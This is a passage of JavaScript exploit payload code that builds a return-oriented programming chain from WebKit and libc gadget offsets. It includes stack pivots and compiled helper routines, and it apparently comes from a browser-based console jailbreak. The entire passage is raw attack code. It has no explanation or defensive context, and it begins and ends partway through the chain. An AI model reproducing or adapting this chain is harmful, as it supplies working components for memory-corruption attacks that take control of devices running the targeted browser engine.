db([4294967295,4294967295]);ropchain_offset += 16384;set_gadgets([libc_base+863109,libc_base+713278,main_ret,webkit_base+4687784,libc_base+165442]);db([0,0]);set_gadgets([pivot_addr,libc_base+713278]);db([8,0]);set_gadgets([libc_base+207036,libc_base+713278,ropchain+65800,webkit_base+4687784,libc_base+740138,webkit_base+1420514]);db([0,0]);set_gadgets([libc_base+430587,libc_base+388400,libc_base+713278,ropchain+65912,webkit_base+4687784,libc_base+740138,libc_base+713278,ropchain+65928,webkit_base+4687784,libc_base+388400,libc_base+713278]);db([16,0]);set_gadget(webkit_base+1420514,);db([0,0]);set_gadget(libc_base+772328,);db([0,0]);set_gadgets([libc_base+507828,libc_base+713278,ropchain+66016,webkit_base+4687784,libc_base+388400,libc_base+713278,ropchain+66032,webkit_base+4687784,libc_base+863109,libc_base+165442]);db([0,0]);set_gadget(libc_base+772328,);db([0,0]);set_gadgets([libc_base+229840,libc_base+713278,ropchain+66192,webkit_base+4687784,libc_base+388400,libc_base+713278,ropchain+66144,webkit_base+4687784,libc_base+863109,libc_base+713278,ropchain+66160,webkit_base+4687784,webkit_base+3789839]);db([0,0]);set_gadget(libc_base+165442,);db([0,0]);set_gadget(libc_base+772328,);db([16,0]);set_gadget(libc_base+768796,);db([0,0]);set_gadgets([libc_base+857161,libc_base+713278,ropchain+66248,webkit_base+4687784,libc_base+388400,libc_base+165442]);db([0,0]);set_gadgets([libc_base+288783,libc_base+713278,ropchain+66360,webkit_base+4687784,webkit_base+13378624,libc_base+713278,ropchain+66392,webkit_base+4687784,webkit_base+1816389,libc_base+713278,ropchain+66376,webkit_base+4687784,webkit_base+3789839]);db([0,0]);set_gadget(libc_base+772328,);db([0,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadgets([webkit_base+6264134,libc_base+713278,ropchain+66552,webkit_base+4687784,libc_base+863109,libc_base+713278,ropchain+66504,webkit_base+4687784,webkit_base+1816389,libc_base+713278,ropchain+66520,webkit_base+4687784,webkit_base+3789839]);
db([0,0]);set_gadget(libc_base+165442,);
db([0,0]);set_gadget(libc_base+772328,);
db([48,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadgets([libc_base+857161,libc_base+857183,libc_base+713278,ropchain+66656,webkit_base+4687784,webkit_base+1816389,libc_base+713278,ropchain+66640,webkit_base+4687784,libc_base+772328]);
db([0,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadget(libc_base+713278,);
db([8,0]);set_gadgets([libc_base+207036,libc_base+430587,libc_base+768796]);
db([8,0]);set_gadget(libc_base+772328,);
db([8,0]);set_gadgets([libc_base+149872,libc_base+713278]);
db([4294967288,4294967295]);set_gadgets([libc_base+207036,libc_base+857161,libc_base+713278,ropchain+66864,webkit_base+4687784,libc_base+863109,libc_base+713278,ropchain+66832,webkit_base+4687784,webkit_base+3789839]);
db([0,0]);set_gadget(libc_base+772328,);
db([48,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadgets([libc_base+857161,libc_base+857183,libc_base+713278,ropchain+66968,webkit_base+4687784,webkit_base+1816389,libc_base+713278,ropchain+66952,webkit_base+4687784,libc_base+772328]);
db([0,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadget(libc_base+713278,);
db([8,0]);set_gadgets([libc_base+207036,libc_base+430587,libc_base+713278,ropchain+67064,webkit_base+4687784,libc_base+740138,libc_base+713278]);
db([16,0]);set_gadget(libc_base+772328,);
db([0,0]);set_gadgets([ libc_base+507828,libc_base+713278,ropchain+67152,webkit_base+4687784,libc_base+388400,libc_base+713278,ropchain+67168,webkit_base+4687784,libc_base+863109,libc_base+165442 ]);
db([0,0]);set_gadget(libc_base+772328,);db([0,0]);set_gadgets([ libc_base+229840,libc_base+713278,ropchain+67328,webkit_base+4687784,libc_base+388400,libc_base+713278,ropchain+67280,webkit_base+4687784,libc_base+863109,libc_base+713278,ropchain+67296,webkit_base+4687784,webkit_base+3789839 ]);
db([0,0]);set_gadget(libc_base+165442,);
db([0,0]);set_gadget(libc_base+772328,);
db([16,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadgets([ libc_base+857161,libc_base+713278,ropchain+67384,webkit_base+4687784,libc_base+388400,libc_base+165442 ]);
db([0,0]);set_gadgets([ libc_base+288783,libc_base+713278,ropchain+67496,webkit_base+4687784,webkit_base+13378624,libc_base+713278,ropchain+67528,webkit_base+4687784,webkit_base+1816389,libc_base+713278,ropchain+67512,webkit_base+4687784,webkit_base+3789839 ]);
db([0,0]);set_gadget(libc_base+772328,);
db([0,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadgets([ webkit_base+6264134,libc_base+713278,ropchain+67688,webkit_base+4687784,libc_base+863109,libc_base+713278,ropchain+67640,webkit_base+4687784,webkit_base+1816389,libc_base+713278,ropchain+67656,webkit_base+4687784,webkit_base+3789839 ]);
db([0,0]);set_gadget(libc_base+165442,);
db([0,0]);set_gadget(libc_base+772328,);
db([48,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadgets([ libc_base+857161,libc_base+857183,libc_base+713278,ropchain+67792,webkit_base+4687784,webkit_base+1816389,libc_base+713278,ropchain+67776,webkit_base+4687784,libc_base+772328 ]);
db([0,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadget(libc_base+713278,);
db([8,0]);set_gadgets([ libc_base+207036,libc_base+430587,libc_base+768796 ]);
db([8,0]);set_gadget(libc_base+772328,);
db([8,0]);set_gadgets([ libc_base+149872,libc_base+713278 ]);
db([4294967288,4294967295]);set_gadgets([ libc_base+207036,libc_base+713278,ropchain+67992,webkit_base+4687784,libc_base+863109,libc_base+713278,ropchain+67960,webkit_base+4687784,webkit_base+3789839 ]);
db([0,0]);set_gadget(libc_base+772328,);
db([32,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadgets([ libc_base+857161,libc_base+857183,libc_base+713278,ropchain+68096,webkit_base+4687784,webkit_base+1816389,libc_base+713278,ropchain+68080,webkit_base+4687784,libc_base+772328 ]);
db([0,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadgets([ libc_base+857183,libc_base+713278,ropchain+68208,webkit_base+4687784,libc_base+863109,libc_base+713278,ropchain+68176,webkit_base+4687784,webkit_base+3789839 ]);
db([0,0]);set_gadget(libc_base+772328,);
db([48,0]);set_gadget(libc_base+768796,);
db([0,0]);set_gadgets([ libc_base+857161,libc_base+857183,libc_base+713278,ropchain+68272,webkit_base+4687784,webkit_base+1816389,libc_base+772328 ]);
db([0,0]);set_gadgets([ libc_base+149872,libc_base+713278,ropchain+68328,webkit_base+4687784,libc_base+863109,libc_base+772328 ]);
db([0,0]);set_gadget(libc_base+713278,);
db([4294967288,4294967295]);
set_gadgets([
libc_base+207036,
webkit_base+72932,
libc_base+713278,
ropchain+68480,
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+68496,
webkit_base+4687784,
libc_base+388400,
libc_base+713278,
ropchain+68464,
webkit_base+4687784,
webkit_base+3789839
]);
db([0,0]);set_gadget(libc_base+165442,);
db([0,0]);set_gadget(libc_base+768796,);
db([0,0]);
set_gadgets([
webkit_base+6264134,
libc_base+713278,
ropchain+68624,
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+68640,
webkit_base+4687784,
libc_base+740138,
libc_base+713278,
ropchain+68608,
webkit_base+4687784,
libc_base+165442
]);
db([0,0]);set_gadget(libc_base+772328,);
db([0,0]);set_gadget(libc_base+768796,);
db([0,0]);
set_gadgets([
libc_base+149872,
libc_base+713278
]);
db([4294967288,4294967295]);
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+68744,
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+68760,
webkit_base+4687784,
webkit_base+1420514
]);
db([0,0]);set_gadget(libc_base+768796,);
db([0,0]);
set_gadgets([
libc_base+149872,
libc_base+713278
]);
db([4294967288,4294967295]);
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+68880,
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+68864,
webkit_base+4687784,
libc_base+768796
]);
db([0,0]);
set_gadget(libc_base+489696,);
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+68968,//L77
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+68952,//L76
webkit_base+4687784,
libc_base+165442
]);
//L76:
db([0,0]);
set_gadget(libc_base+768796,);
//L77:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+69072,//L78
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+69088,//L79
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L78:
db([0,0]);
set_gadget(libc_base+768796,);
//L79:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+69208,//L80
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+69192,//L81
webkit_base+4687784,
libc_base+768796
]);
//L81:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L80:
db([0,0]);
//___builtin_bswap32:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+69280,//L83
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L83:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+69392,//L86
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+69408,//L87
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
//L84:
db([16,0]);// 0x10
set_gadget(webkit_base+1420514,);//pop r8
//L86:
db([0,0]);
set_gadget(libc_base+772328,);
//L87:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+69496,//L89
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+69512,//L90
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L89:
db([0,0]);
set_gadget(libc_base+772328,);
//L90:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+69672,//L92
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+69704,//L94
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+69656,//L91
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+69688,//L93
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L91:
db([0,0]);
set_gadget(libc_base+165442,);
//L92:
db([0,0]);
set_gadget(libc_base+772328,);
//L93:
db([0,0]);
set_gadget(libc_base+768796,);
//L94:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+69800,//L96
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+69784,//L95
webkit_base+4687784,
libc_base+165442
]);
//L95:
db([0,0]);
set_gadget(libc_base+768796,);
//L96:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L97:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L98:
db([24,0]);// 0x18
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+70000,//L101
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+69968,//L99
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L99:
db([0,0]);
set_gadget(libc_base+772328,);
//L100:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L101:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+70104,//L103
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+70088,//L102
webkit_base+4687784,
libc_base+772328
]);
//L102:
db([0,0]);
set_gadget(libc_base+768796,);
//L103:
db([0,0]);
set_gadgets([
libc_base+857183,
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+70208,//L106
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L104:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L106:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+70296,//L108
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+70312,//L109
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L108:
db([0,0]);
set_gadget(libc_base+772328,);
//L109:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+70472,//L111
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+70504,//L113
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+70456,//L110
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+70488,//L112
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L110:
db([0,0]);
set_gadget(libc_base+165442,);
//L111:
db([0,0]);
set_gadget(libc_base+772328,);
//L112:
db([0,0]);
set_gadget(libc_base+768796,);
//L113:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+70600,//L115
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+70584,//L114
webkit_base+4687784,
libc_base+165442
]);
//L114:
db([0,0]);
set_gadget(libc_base+768796,);
//L115:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L117:
db([16711680,0]);// 0xff0000
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+70712,//L119
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L119:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+5236215,//and rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L120:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L121:
db([8,0]);// 0x8
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+70944,//L124
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+70912,//L122
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L122:
db([0,0]);
set_gadget(libc_base+772328,);
//L123:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L124:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+71048,//L126
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+71032,//L125
webkit_base+4687784,
libc_base+772328
]);
//L125:
db([0,0]);
set_gadget(libc_base+768796,);
//L126:
db([0,0]);
set_gadgets([
libc_base+857183,
libc_base+713278,
ropchain+71104,//L128
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L128:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+71160,//L130
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L130:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+72932,//or rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+71288,//L133
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L131:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L133:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+71376,//L135
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+71392,//L136
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L135:
db([0,0]);
set_gadget(libc_base+772328,);
//L136:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+71552,//L138
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+71584,//L140
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+71536,//L137
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+71568,//L139
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L137:
db([0,0]);
set_gadget(libc_base+165442,);
//L138:
db([0,0]);
set_gadget(libc_base+772328,);
//L139:
db([0,0]);
set_gadget(libc_base+768796,);
//L140:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+71680,//L142
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+71664,//L141
webkit_base+4687784,
libc_base+165442
]);
//L141:
db([0,0]);
set_gadget(libc_base+768796,);
//L142:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L144:
db([65280,0]);// 0xff00
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+71792,//L146
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L146:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+5236215,//and rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L147:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L148:
db([8,0]);// 0x8
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+857161,
libc_base+713278,
ropchain+71976,//L150
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L150:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+72032,//L152
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L152:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+72932,//or rax,rcx
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+72160,//L155
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L153:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L155:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+72248,//L157
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+72264,//L158
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L157:
db([0,0]);
set_gadget(libc_base+772328,);
//L158:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+72424,//L160
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+72456,//L162
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+72408,//L159
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+72440,//L161
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L159:
db([0,0]);
set_gadget(libc_base+165442,);
//L160:
db([0,0]);
set_gadget(libc_base+772328,);
//L161:
db([0,0]);
set_gadget(libc_base+768796,);
//L162:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+72552,//L164
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+72536,//L163
webkit_base+4687784,
libc_base+165442
]);
//L163:
db([0,0]);
set_gadget(libc_base+768796,);
//L164:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L165:
db([24,0]);// 0x18
set_gadget(libc_base+772328,);
//L166:
db([24,0]);// 0x18
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+857161,
libc_base+713278,
ropchain+72704,//L168
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L168:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+72760,//L170
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L170:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+72932,//or rax,rcx
libc_base+713278,
ropchain+72896,//L173
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+72864,//L171
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L171:
db([0,0]);
set_gadget(libc_base+772328,);
//L172:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L173:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+73032,//L175
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+73048,//L176
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+73016,//L174
webkit_base+4687784,
libc_base+165442
]);
//L174:
db([0,0]);
set_gadget(libc_base+772328,);
//L175:
db([0,0]);
set_gadget(libc_base+768796,);
//L176:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+73152,//L177
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+73168,//L178
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L177:
db([0,0]);
set_gadget(libc_base+768796,);
//L178:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+73288,//L179
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+73272,//L180
webkit_base+4687784,
libc_base+768796
]);
//L180:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L179:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+73376,//L182
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+73360,//L181
webkit_base+4687784,
libc_base+165442
]);
//L181:
db([0,0]);
set_gadget(libc_base+768796,);
//L182:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+73480,//L183
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+73496,//L184
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L183:
db([0,0]);
set_gadget(libc_base+768796,);
//L184:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+73616,//L185
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+73600,//L186
webkit_base+4687784,
libc_base+768796
]);
//L186:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L185:
db([0,0]);
//___builtin_bswap64:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+73688,//L188
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L188:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+73752,//L190
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L190:
db([0,0]);
set_gadget(libc_base+713278,);
db([16,0]);// 0x10
set_gadgets([
libc_base+207036,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+73848,//L193
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L191:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L193:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+73920,//L196
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L194:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L196:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+2989859,//mov [rax],rcx
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L197:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+772328,);
//L199:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+74040,//L201
webkit_base+4687784,
libc_base+772328
]);
//L200:
db([0,0]);
set_gadget(libc_base+768796,);
//L201:
db([0,0]);
set_gadgets([
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+74096,//L204
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L204:
db([0,0]);
//L202:
set_gadgets([
libc_base+713278,
ropchain+74160,//L207
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L205:
db([4294967284,4294967295]);// -0xc
set_gadget(libc_base+772328,);
//L207:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+74248,//L209
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+74264,//L210
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L209:
db([0,0]);
set_gadget(libc_base+772328,);
//L210:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+74424,//L212
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+74456,//L214
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+74408,//L211
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+74440,//L213
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L211:
db([0,0]);
set_gadget(libc_base+165442,);
//L212:
db([0,0]);
set_gadget(libc_base+772328,);
//L213:
db([0,0]);
set_gadget(libc_base+768796,);
//L214:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+74536,//L215
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+74552,//L216
webkit_base+4687784,
libc_base+165442
]);
//L215:
db([0,0]);
set_gadget(libc_base+768796,);
//L216:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+74648,//L218
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+74632,//L217
webkit_base+4687784,
libc_base+165442
]);
//L217:
db([0,0]);
set_gadget(libc_base+768796,);
//L218:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+74744,//L220
webkit_base+4687784,
libc_base+768796
]);
//L219:
db([4,0]);// 0x4
set_gadget(webkit_base+3789839,);//pop r11
//L220:
db([0,0]);
set_gadget(libc_base+165442,);
//L221:
db([4,0]);// 0x4
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+74888,//L223
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+74904,//L224
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+74872,//L222
webkit_base+4687784,
libc_base+165442
]);
//L222:
db([0,0]);
set_gadget(libc_base+772328,);
//L223:
db([0,0]);
set_gadget(libc_base+768796,);
//L224:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+15055763,//cmp rax,rcx ;sete al
webkit_base+47019,//setl al
libc_base+232261,//movzx eax,al
libc_base+713278,
ropchain+75080,//L226
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+75096,//L227
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+75064,//L225
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L225:
db([0,0]);
set_gadget(libc_base+165442,);
//L226:
db([0,0]);
set_gadget(libc_base+768796,);
//L227:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
